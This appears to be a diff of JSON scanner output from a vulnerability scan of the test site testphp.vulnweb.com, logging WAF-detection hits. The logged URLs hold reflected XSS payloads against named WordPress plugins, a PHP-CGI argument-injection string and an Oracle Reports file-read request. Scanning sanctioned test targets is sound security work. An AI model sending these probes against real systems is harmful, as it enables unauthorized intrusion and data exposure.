+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/users/sign_in?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/users/sign_in?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/_vti_bin/shtml.exe/_vti_rpc?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/_vti_bin/shtml.dll/_vti_rpc?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/_vti_bin/shtml.exe/_vti_rpc?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/_vti_bin/shtml.dll/_vti_rpc?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/%2F..%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/%2F..%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/login.action?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/login.action?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/sniplets/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/sniplets/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/sniplets/view/sniplets/warning.php?p=valid&pp=12&text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/sniplets/view/sniplets/warning.php?pp=12&text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/axis2/axis2-admin/login?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/axis2/axis2-admin/login?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/axis2-admin/login?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/axis2-admin/login?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/index.php?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/index.php?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/lcms/index.php?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/lcms/index.php?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/advanced-text-widget/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/advanced-text-widget/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/advanced-text-widget/advancedtext.php?pp=12&pp=12&page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/flash-album-gallery/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/advanced-text-widget/advancedtext.php?p=valid&p=valid&pp=12&pp=12&page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/flash-album-gallery/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/login-x.php?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/flash-album-gallery/facebook.php?p=valid&pp=12&i=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/flash-album-gallery/facebook.php?pp=12&i=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/login-x.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/adminimize/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/adminimize/adminimize_page.php?p=valid&pp=12&page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/adminimize/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/alert-before-your-post/trunk/post_alert.php?p=valid&pp=12&name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/alert-before-your-post/trunk/post_alert.php?pp=12&name=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/adminimize/adminimize_page.php?pp=12&page=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/skysa-official/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/skysa-official/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/skysa-official/skysa.php?p=valid&pp=12&submit=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/skysa-official/skysa.php?pp=12&submit=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/clickdesk-live-support-chat/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/clickdesk-live-support-chat/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/featurific-for-wordpress/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/clickdesk-live-support-chat/clickdesk.php?pp=12&cdwidgetid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/featurific-for-wordpress/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/clickdesk-live-support-chat/clickdesk.php?p=valid&pp=12&cdwidgetid=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/featurific-for-wordpress/cached_image.php?pp=12&snum=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/featurific-for-wordpress/cached_image.php?p=valid&pp=12&snum=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/index.php?p=valid&p=valid&pp=12&pp=12&-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/index.php?pp=12&pp=12&-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/yousaytoo-auto-publishing-plugin/yousaytoo.php?p=valid&pp=12&submit=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/all-in-one-event-calendar/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/all-in-one-event-calendar/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?pp=12&title=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/all-in-one-event-calendar/app/view/agenda-widget.php?p=valid&pp=12&title=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/wp-facethumb/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/wp-facethumb/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12&page_id=1&pagination_wp_facethumb=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/yousaytoo-auto-publishing-plugin/yousaytoo.php?pp=12&submit=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/?p=valid&pp=12&page_id=1&pagination_wp_facethumb=1%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/reports/rwservlet/showenv?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/reports/rwservlet/showenv?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/mf-gig-calendar/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/mf-gig-calendar/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/reports/rwservlet?pp=12&report=test.rdf&desformat=html&destype=cache&JOBTYPE=rwurl&URLPARAMETER=file:///",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/reports/rwservlet?p=valid&pp=12&report=test.rdf&desformat=html&destype=cache&JOBTYPE=rwurl&URLPARAMETER=file:///",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/?pp=12&page_id=2&%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/?p=valid&pp=12&page_id=2&%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/2-click-socialmedia-buttons/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/2-click-socialmedia-buttons/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/download-monitor/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/download-monitor/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/2-click-socialmedia-buttons/libs/xing.php?p=valid&pp=12&xing-url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/2-click-socialmedia-buttons/libs/xing.php?pp=12&xing-url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/?p=valid&pp=12&dlsearch=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/wp-integrator/readme.txt?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/wp-integrator/readme.txt?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-login.php?pp=12&redirect_to=http%3A%2F%2F%3F1%3C%2FsCripT%3E%3CsCripT%3Ealert%28document.domain%29%3C%2FsCripT%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-login.php?p=valid&pp=12&redirect_to=http%3A%2F%2F%3F1%3C%2FsCripT%3E%3CsCripT%3Ealert%28document.domain%29%3C%2FsCripT%3E",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/wp-content/plugins/age-verification/age-verification.php?p=valid&p=valid&pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/wp-content/plugins/age-verification/age-verification.php?pp=12&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/user.action?pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
+            "url": "http://testphp.vulnweb.com/hpp/params.php/user.action?p=valid&pp=12",
+            "template_id": "global-waf-detect",
+            "tags": [
+                "waf-detect",
+                "discovery"
+            ]
+        },
+        {
+            "name": "Global WAF Detect Matchers",
+            "severity": "info",
